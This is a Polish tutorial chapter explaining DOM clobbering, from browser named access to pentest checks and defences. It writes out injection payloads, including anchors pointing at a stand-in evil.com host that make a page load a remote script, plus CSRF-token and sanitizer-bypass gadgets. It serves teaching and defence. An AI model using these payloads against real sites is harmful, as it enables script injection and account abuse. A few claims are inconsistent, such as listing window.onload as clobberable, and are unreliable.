# Rozdział 10: DOM Clobbering

## 1. Czym jest DOM Clobbering

**DOM Clobbering** to technika ataku polegająca na wstrzyknięciu elementów HTML z atrybutami `id` lub `name` w taki sposób, że "zaśmiecają" (clobber = tłuc, niszczyć) globalne zmienne JavaScript lub właściwości obiektów.

Mechanizm wynika ze specyficznego zachowania przeglądarek: elementy HTML z atrybutem `id` automatycznie stają się właściwościami obiektu `window`. Elementy z atrybutem `name` (w kontekście `form`, `embed`, `iframe`, `object`, `img`) też trafiają do `window`.

Jeśli aplikacja JavaScript sprawdza `window.config` lub `config.isAdmin`, a atakujący może wstrzyknąć `<div id="config"><input name="isAdmin" value="true"></div>`, to `window.config` będzie elementem DOM, a `window.config.isAdmin` — elementem input.

DOM Clobbering nie jest błędem przeglądarki — to zaplanowane historyczne zachowanie (Netscape, 1990s), które koliduje z nowoczesnymi wzorcami JavaScript.

### Gdzie działa

Każda przeglądarka. Jest to specyfikowane zachowanie (HTML Living Standard, sekcja "named access on the Window object").

---

## 2. Dlaczego powstał (jako podatność)

### Historyczne korzenie

Zanim JavaScript stał się dominującym językiem webowym, programiści stron potrzebowali szybkiego dostępu do elementów formularza. Netscape wprowadził możliwość dostępu do elementów przez `window.formName.fieldName` zamiast długiego `document.getElementById(...)`.

To było wygodne — `window.loginForm.username.value` zamiast `document.getElementById("loginForm").elements["username"].value`.

### Kolizja z nowoczesnym JavaScript

Nowoczesne aplikacje SPA używają zmiennych JavaScript do przechowywania konfiguracji i stanu:

```javascript
// Nowoczesna aplikacja
window.appConfig = { debug: false, apiUrl: "/api" };

// Sprawdzenie w kodzie
if (window.appConfig && window.appConfig.debug) {
    enableDebugMode();
}
```

Jeśli atakujący może wstrzyknąć HTML `<form id="appConfig"><input name="debug" value="true"></form>`, to `window.appConfig` stanie się elementem `<form>`, a `window.appConfig.debug` — elementem `<input>`. Element HTML jest **truthy** w JavaScript — więc `if (window.appConfig.debug)` może zwrócić true!

---

## 3. Jak działa

### Named access na window

Specyfikacja HTML definiuje "named access on Window object":

> Gdy kod odwołuje się do `window.name` lub `name` globalnie, przeglądarka:
> 1. Sprawdza normalne właściwości JavaScript na `window`
> 2. Jeśli nie znalazł — szuka elementu z `id=name` w dokumencie
> 3. Jeśli nie znalazł — szuka elementów z `name=name` (form, img, etc.)

Krok 2 i 3 to właśnie mechanizm clobbering.

### Kolizja z JavaScript

```html
<!-- Atakujący wstrzykuje ten HTML -->
<div id="secretConfig">
    <a id="secretConfig" name="apiKey" href="https://evil.com">
</div>
```

```javascript
// Kod aplikacji zakłada że secretConfig to obiekt JS
if (window.secretConfig) {
    fetch(window.secretConfig.apiKey); // window.secretConfig to <div>!
}

// window.secretConfig.apiKey = element <a> (bo name="apiKey" w form/list)
// Lub po prostu undefined — ale window.secretConfig jest truthy!
```

### Hierarchia clobbering

**Poziom 1:** Pojedynczy element z `id`

```html
<img id="config">
```

```javascript
window.config; // HTMLImageElement
```

**Poziom 2:** Kolekcja elementów z tym samym `id` lub `name`

```html
<img id="config">
<img id="config">
```

```javascript
window.config; // HTMLCollection [img, img]
```

**Poziom 3:** Zagnieżdżenie przez formularz

```html
<form id="config">
    <input name="apiKey" value="evil">
</form>
```

```javascript
window.config;        // HTMLFormElement
window.config.apiKey; // HTMLInputElement (przez HTMLFormElement.elements[name])
```

**Poziom 4:** Iframe z `name`

```html
<iframe id="config" name="config" src="https://evil.com">
```

```javascript
window.config; // iframe.contentWindow (okno iframe'a!)
// Możliwość dostępu do window.config.location.href etc.
```

### anchor + form trick (DOMPurify bypass)

Popularna technika obchodząca sanityzery:

```html
<!-- DOMPurify często przepuszcza te tagi (bezpieczne per se) -->
<a id="defaultView" href="//evil.com">
<form id="some-id">
    <input name="defaultView" value="override">
</form>
```

Ta technika pozwala na dwupoziomowe clobbering przez formularz.

---

## 4. Co dzieje się wewnętrznie

### Implementacja w silniku przeglądarki

W kodzie C++ przeglądarki, gdy JavaScript odwołuje się do właściwości `window.xyz`:

1. Sprawdź czy `xyz` to natywna właściwość `window` (np. `window.location`, `window.document`)
2. Jeśli nie — wywołaj `document.namedItem("xyz")`
3. `namedItem` przeszukuje DOM pod kątem elementów z `id=xyz` lub `name=xyz`
4. Zwróć element lub kolekcję

### Priorytety

Natywne właściwości `window` mają WYŻSZY priorytet niż named access:

```html
<div id="location">fake</div>
```

```javascript
window.location; // nadal prawdziwy Location object — nie da się clobberować!
```

Nie można clobberować: `window.location`, `window.document`, `window.frames`, `window.self`, `window.top`, `window.parent`, `window.window` i innych natywnych właściwości.

### Które elementy mogą być użyte

Do clobbering przez `id`:
- Prawie wszystkie elementy HTML

Do clobbering przez `name`:
- `form`, `iframe`, `img`, `embed`, `object` (i ich dzieci przez `form.elements`)

### innerHTML i clobbering

DOMPurify i inne sanityzery mają specjalne obsługiwanie clobbering-prone elementów, ale "clobbering gadgets" to aktywny obszar badań i bypass DOMPurify.

---

## 5. Analogiczny przykład z życia

Wyobraź sobie biuro z tablicą ogłoszeń (window object):

- Pracownicy (JavaScript) szukają dokumentów na tablicy
- Dokumenty są opisane nazwami (właściwości window)
- Zarząd (natywne właściwości JS) ma zastrzeżone miejsca na tablicy

Nowy pracownik (atakujący) przychodzi z fałszywym dokumentem zatytułowanym "Regulamin" i wiesza go na tablicy. Gdy prawdziwy pracownik szuka "Regulaminu" — znajduje fałszywy.

Problem: biuro nie weryfikuje kto wiesza dokumenty (brak sanityzacji HTML), i pracownicy nie sprawdzają czy znaleziony dokument to prawdziwy text czy kartka z papieru (brak sprawdzenia typeof).

---

## 6. Przykład kodu

```html
<!-- Aplikacja ofiara -->
<!DOCTYPE html>
<html>
<head>
    <script>
        // Kod aplikacji
        window.onload = function() {
            // Zakłada że config to obiekt JS jeśli istnieje
            if (window.config) {
                // BUG: nie sprawdza czy config to obiekt JS czy element DOM
                const apiUrl = window.config.apiUrl || "/api/v1";
                const debug = window.config.debug || false;
                
                console.log("API:", apiUrl);
                if (debug) {
                    enableDebugMode(); // wykonuje się jeśli debug jest truthy
                }
            }
        };
    </script>
</head>
<body>
    <!-- Atakujący może wstrzyknąć HTML w "bezpiecznej" sekcji strony -->
    <!-- np. w polu bio użytkownika które pozwala na "bezpieczne" tagi -->
    
    <!-- Wstrzyknięcie: -->
    <form id="config">
        <input name="debug" value="true">
        <input name="apiUrl" value="https://evil.com/api">
    </form>
    
    <!-- Po załadowaniu strony: -->
    <!-- window.config → HTMLFormElement (truthy!) -->
    <!-- window.config.debug → HTMLInputElement (truthy! — element istnieje) -->
    <!-- window.config.apiUrl → HTMLInputElement z value="https://evil.com/api" -->
    <!-- ALE window.config.apiUrl to element, nie string! -->
    <!-- Zależy od jak aplikacja używa tych wartości... -->
</body>
</html>
```

**Bardziej precyzyjny przykład:**

```html
<!-- Payload: DOMClobbering clobbering configu używanego jako URL -->
<a id="cdnUrl" href="https://evil.com/malicious.js">

<!-- Kod aplikacji: -->
<script>
    const scriptUrl = window.cdnUrl || "https://trusted-cdn.com/lib.js";
    
    // Jeśli cdnUrl nie jest ustawione jako JS var, ale istnieje element <a id="cdnUrl">
    // window.cdnUrl = HTMLAnchorElement
    // scriptUrl = HTMLAnchorElement (truthy!)
    
    const script = document.createElement("script");
    script.src = scriptUrl; // implicit toString() → href atrybutu elementu!
    // <a href="https://evil.com/malicious.js"> → .toString() = "https://evil.com/malicious.js"
    document.head.appendChild(script); // ładuje złośliwy skrypt!
</script>
```

**Kluczowe:** `element.toString()` na `HTMLAnchorElement` zwraca wartość `href`. To jest mechanizm który sprawia że clobbering URL jest tak skuteczny.

---

## 7. Przykład z prawdziwej aplikacji

### Bypass DOMPurify przez DOM Clobbering

Historyczny atak (przed poprawkami):

```javascript
// Aplikacja używa DOMPurify do sanityzacji HTML
const sanitized = DOMPurify.sanitize(userInput, { RETURN_DOM: false });
container.innerHTML = sanitized;

// Payload który przechodzi przez DOMPurify (nie zawiera skryptów):
// <a id="anchors">
// <a id="anchors">

// Po wstawieniu do DOM:
// document.getElementById("anchors") → HTMLCollection
// Niektóre wewnętrzne mechanizmy DOMPurify używają document.getElementById
// → może zwrócić kolekcję zamiast null → bypass filtrów
```

### Real-world: HackerOne Reports

Kilka publicznych raportów HackerOne dotyczy DOM Clobbering:
- Clobbering `window.onload` przez `<img name="onload">`
- Clobbering `document.forms` przez wielokrotne `<form>`
- Clobbering wewnętrznych zmiennych frameworków

### CMS/Blog platforms

```javascript
// Typowy kod bloga/CMS
if (!window.NONCE) {
    // Zakłada że NONCE musi być ustawiony przez serwer
    document.getElementById("form").setAttribute("action", "/api/post");
}

// Atakujący w treści posta wstrzykuje (jeśli CMS pozwala na "bezpieczne" HTML):
// <a id="NONCE" href="#">
// → window.NONCE = HTMLAnchorElement (truthy) → kod nie ustawia action
// Lub odwrotny scenariusz w zależności od logiki
```

---

## 8. Typowe błędy programistów

### Błąd 1: Brak sprawdzenia typu przed użyciem window properties

```javascript
// BŁĄD: zakłada że window.config to obiekt JS
const url = window.config.apiUrl; // może być element DOM!

// POPRAWKA: sprawdź typ
const url = (window.config instanceof Object && !(window.config instanceof Element))
    ? window.config.apiUrl
    : "/api/default";

// Lub jeszcze lepiej: używaj własnych zmiennych, nie window
const appConfig = { apiUrl: "/api/v1" }; // własna zmienna, nie window
```

### Błąd 2: || fallback podatny na clobbering

```javascript
// BŁĄD: element DOM jest truthy, więc fallback nie zadziała
const config = window.appConfig || { debug: false };
// Jeśli window.appConfig to element DOM → config = element DOM, nie { debug: false }

// POPRAWKA: sprawdź czy to zwykły obiekt
function isPlainObject(val) {
    return val !== null && typeof val === 'object' && val.constructor === Object;
}

const config = isPlainObject(window.appConfig) ? window.appConfig : { debug: false };
```

### Błąd 3: typeof nie chroni przed clobbering

```javascript
// MYLNE: typeof element to "object" — nie wykrywa clobbering
if (typeof window.config === 'object') {
    // HTMLElement też jest 'object'!
    doSomethingWith(window.config);
}

// POPRAWKA: instanceof
if (window.config instanceof HTMLElement) {
    // To jest clobbered! Ignoruj
} else if (typeof window.config === 'object') {
    // To jest prawdziwy obiekt JS
    doSomethingWith(window.config);
}
```

### Błąd 4: Formularz i HTMLFormElement.elements

```javascript
// SUBTELNE: myForm.elements["fieldName"] zwraca element input
const form = document.getElementById("loginForm");
const username = form.elements["username"]; // HTMLInputElement
const password = form.elements["password"]; // HTMLInputElement

// Jeśli ktoś wstrzyknie element z name="elements":
// <input name="elements"> wewnątrz form
// form.elements → HTMLInputElement (clobbered!)
// form.elements["username"] → TypeError lub unexpected behavior
```

---

## 9. Znaczenie dla bezpieczeństwa

### Klasyfikacja

DOM Clobbering jest:
- **CWE-79** (XSS) — gdy prowadzi do wykonania kodu
- **CWE-20** — Improper Input Validation
- **PortSwigger Research** — aktywny obszar badań (Gareth Heyes, PortSwigger)

### Skutki

1. **XSS Escalation** — gdy clobbering zastępuje URL ładowanego skryptu
2. **Logic Bypass** — gdy clobbering wpływa na warunki autoryzacji
3. **DOMPurify Bypass** — obejście popularnego sanityzera

### Bypass Sanitizers

DOMPurify i inne sanityzery walczą z DOM Clobbering przez:
- Filtrowanie elementów z `id`/`name` kolidującymi z globalnymi
- Opcja `SANITIZE_NAMED_PROPS: true` (DOMPurify 3.x)

Ale bypass gadgety są regularnie odkrywane:
```javascript
// Historyczne bypass (już załatane)
// <a id="body"><a id="body" name="childNodes">
// → document.body.childNodes clobbered przez kolekcję
```

### innerHTML vs clobbering

Clobbering jest szczególnie groźne gdy:
1. Aplikacja przyjmuje HTML z zewnątrz (przez innerHTML, rich text editor)
2. Wstrzyknięty HTML przechodzi przez "white-list" filtr który pozwala na `id`/`name`
3. JavaScript używa `window.xyz` lub `document.xyz` gdzie xyz może być clobbered

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Console — sprawdzanie clobbering

```javascript
// Sprawdź co window.config to jest
console.log(typeof window.config);
console.log(window.config instanceof HTMLElement); // true → clobbered!
console.log(window.config instanceof Element);

// Sprawdź named access
const testId = "test_clobbering_" + Date.now();
const div = document.createElement("div");
div.id = testId;
document.body.appendChild(div);
console.log(window[testId]); // HTMLElement → named access działa → potencjalnie podatne
div.remove();
```

### Identyfikacja wektorów

Szukaj w aplikacji:

1. **Miejsc gdzie HTML jest akceptowany z zewnątrz:**
   - Rich text editory
   - Sekcje bio/opis profilu
   - Komentarze HTML
   - Importowane dokumenty

2. **Kodu JavaScript który polega na `window.*`:**
   ```javascript
   // Szukaj w Sources (Ctrl+Shift+F):
   window.config
   window.settings
   window.csrf
   window.token
   // i innych window.XXX gdzie XXX może być clobbered
   ```

3. **Sprawdź id i name istniejących elementów:**
   ```javascript
   // Czy jakieś id/name kolidują z używanymi zmiennymi JS?
   document.querySelectorAll("[id],[name]").forEach(el => {
       const n = el.id || el.name;
       if (window[n] && window[n] !== el) {
           console.log("Conflict:", n, window[n], el);
       }
   });
   ```

### Burp Suite — testowanie HTML injection

1. Znajdź pola akceptujące HTML (rich text, komentarze, bio)
2. Wyślij payload: `<a id="testClobber" href="https://evil.com">`
3. Sprawdź w DevTools: `window.testClobber` — czy to HTMLAnchorElement?
4. Sprawdź czy aplikacja JavaScript używa `window.testClobber`

### Identyfikacja przez Network

Jeśli clobbering podmienia URL skryptu:
- **Network tab** → szukaj requestów do nieoczekiwanych domen
- Skrypt załadowany z `evil.com` zamiast `cdn.example.com`

---

## 11. Jak testować bezpieczeństwo

```
□ Czy aplikacja akceptuje HTML z id lub name atrybutami z zewnątrz?
□ Czy JavaScript używa window.XXX gdzie XXX może być clobbered?
□ Czy kod sprawdza typ przed użyciem window właściwości (instanceof vs typeof)?
□ Czy || fallback działa poprawnie gdy window.X to element DOM (truthy)?
□ Czy DOMPurify jest używane z opcją SANITIZE_NAMED_PROPS: true?
□ Czy HTMLFormElement.elements może być clobbered przez input z name="elements"?
□ Czy URLe skryptów dynamicznie ładowanych mogą być clobbered?
□ Czy iframe z name mogą zastąpić window właściwości (contentWindow)?
□ Czy anchor toString() może podmienić URL w string concatenation?
□ Czy sanitizer (DOMPurify, etc.) jest aktualny pod kątem clobbering bypass?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Clobbering URL dynamicznie ładowanego skryptu

**Wymagania:** 
- Aplikacja dynamicznie ładuje skrypt z URL przechowywego w `window.libUrl`
- Atakujący może wstrzyknąć HTML z `id="libUrl"`

**Przebieg:**
```html
<!-- Payload wstrzyknięty w "bezpieczne" pole (np. bio profilu) -->
<a id="libUrl" href="https://evil.com/malicious.js">click here</a>

<!-- Kod aplikacji: -->
<script>
    const url = window.libUrl || "https://cdn.trusted.com/lib.js";
    // window.libUrl = HTMLAnchorElement (clobbered)
    // url = HTMLAnchorElement
    
    const script = document.createElement('script');
    script.src = url; // .src = element → implicit toString() → href = "https://evil.com/malicious.js"
    document.head.appendChild(script); // ładuje złośliwy skrypt!
</script>
```

**Wpływ:** Pełne XSS — wykonanie kodu JavaScript z dowolnego źródła.

### Scenariusz 2: Bypass mechanizmu CSRF przez clobbering tokenu

**Wymagania:**
- Aplikacja przechowuje CSRF token w `window.csrfToken`
- Atakujący może wstrzyknąć HTML

**Przebieg:**
```html
<!-- Payload: -->
<input id="csrfToken" name="csrf" value="">

<!-- Kod aplikacji: -->
<script>
    async function makeRequest(data) {
        await fetch('/api/action', {
            method: 'POST',
            headers: {
                'X-CSRF-Token': window.csrfToken || '', // clobbered → "" (value atrybutu)
            },
            body: JSON.stringify(data)
        });
    }
</script>

<!-- Jeśli serwer akceptuje pusty CSRF token → bypass! -->
```

**Wpływ:** Omijanie CSRF protection.

### Scenariusz 3: Debug Mode przez clobbering flagi

**Wymagania:** Aplikacja sprawdza `window.debugMode` i ma inne zachowanie w trybie debug.

**Przebieg:**
```html
<img id="debugMode">
```

```javascript
// Kod aplikacji:
if (window.debugMode) {
    // Tryb debug: wysyła stack traces, loguje dane wrażliwe
    sendErrorDetails(error.stack); // wyciek informacji!
    window.app.showAdminPanel(); // ujawnia panele admin
}
// window.debugMode = HTMLImageElement (truthy!) → tryb debug aktywny!
```

---

## 13. Jak się zabezpieczać

### Unikaj polegania na window.* dla konfiguracji

```javascript
// ZŁE — podatne na clobbering
const apiUrl = window.appConfig?.apiUrl || "/api";

// DOBRE — własna zmienna, nie window
(function() {
    const appConfig = {
        apiUrl: "/api/v1",
        debug: false
    };
    
    // Użyj appConfig zamiast window.appConfig
    // Zmienna jest w function scope — niedostępna przez window.*
    initApp(appConfig);
})();
```

### Sprawdzaj typ przed użyciem

```javascript
// Pomocnicza funkcja sprawdzająca czy to "prawdziwy" obiekt
function isPlainObject(value) {
    if (value === null || value === undefined) return false;
    if (value instanceof Element) return false;  // DOM element
    if (value instanceof Node) return false;      // DOM node
    return typeof value === 'object';
}

// Użycie:
const config = isPlainObject(window.appConfig) 
    ? window.appConfig 
    : defaultConfig;
```

### DOMPurify z ochroną przed clobbering

```javascript
// DOMPurify 3.x
const sanitized = DOMPurify.sanitize(html, {
    SANITIZE_DOM: true,          // domyślnie true — sanityzuje id/name
    SANITIZE_NAMED_PROPS: true,  // dodatkowa ochrona przed named access clobbering
    FORBID_ATTR: ['id', 'name']  // całkowity zakaz atrybutów id i name (bardzo restrykcyjne)
});
```

### Content Security Policy

```http
Content-Security-Policy: require-trusted-types-for 'script';
```

Trusted Types wymuszają że skrypty mogą być ładowane tylko przez zaufane polityki — nawet jeśli URL jest clobbered, nie załaduje się bez zatwierdzenia przez politykę.

### Izolacja konfiguracji w module

```javascript
// config.mjs — izolowany moduł, nie window
const CONFIG = Object.freeze({
    API_URL: "/api/v1",
    DEBUG: false
});

export const getConfig = () => CONFIG;

// Użycie:
import { getConfig } from './config.mjs';
const { API_URL } = getConfig(); // nie window.API_URL
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. DOM Clobbering = elementy HTML z `id`/`name` "zaśmiecają" `window.*` i mogą zastąpić zmienne JavaScript
2. Mechanizm pochodzi z historycznych przeglądarek — jest świadomie utrzymywany dla kompatybilności
3. Natywnych właściwości window (`location`, `document`) nie można clobbered
4. Anchor element `.toString()` zwraca `href` — kluczowe dla URL clobbering
5. DOMPurify ma opcje ochrony — używaj `SANITIZE_NAMED_PROPS: true`

**Najczęstsze nieporozumienia:**

- "`typeof` wykrywa clobbering" — NIE. `typeof HTMLElement === 'object'`
- "Clobbering to tylko teoretyczny atak" — NIE. Aktywnie używany w prawdziwych atakach i bug bounty
- "DOMPurify chroni automatycznie" — Tylko w niektórych konfiguracjach. Clobbering bypass DOMPurify był wielokrotnie znajdowany.

---

## Jak rozpoznać w prawdziwej aplikacji

1. **DevTools → Console** → sprawdź `window.config instanceof Element` dla kluczowych obiektów
2. **Sources** → Ctrl+Shift+F → szukaj `window.` + nazwy potencjalnie clobberable zmiennych
3. **Elements** → sprawdź atrybuty `id` i `name` elementów — czy kolidują z JS zmiennymi?
4. Wstrzyknij testowy HTML z `id="testClobber"` i sprawdź `window.testClobber` w Console

---

## Powiązania

```
DOM Clobbering
        │
        ├──► DOM (Rozdział 9)
        │         DOM named access jest mechanizmem umożliwiającym clobbering
        │
        ├──► Scope (Rozdział 4)
        │         Clobbering wpływa na Global Scope (window.*)
        │
        ├──► Prototype Chain (Rozdział 6)
        │         HTMLElement ma własny Prototype Chain — różny od {}
        │
        ├──► CSP (Rozdział 36)
        │         Trusted Types chroni przed ładowaniem clobbered URLi skryptów
        │
        └──► Trusted Types (Rozdział 37)
                  Bezpośrednia obrona przed skutkami DOM Clobbering dla script src
```
